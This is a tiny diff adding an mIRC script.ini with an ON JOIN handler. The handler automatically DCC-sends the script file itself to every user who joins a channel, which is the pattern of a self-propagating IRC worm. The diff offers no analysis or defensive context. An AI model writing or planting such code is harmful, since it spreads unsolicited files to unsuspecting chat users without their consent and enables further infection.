@@ -1,0 +1,6 @@
+[SCRIPT]
+n0=;The ON JOIN method
+n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } 
+n2=  /dcc send $nick $script.ini                
+n3=}
+n4=
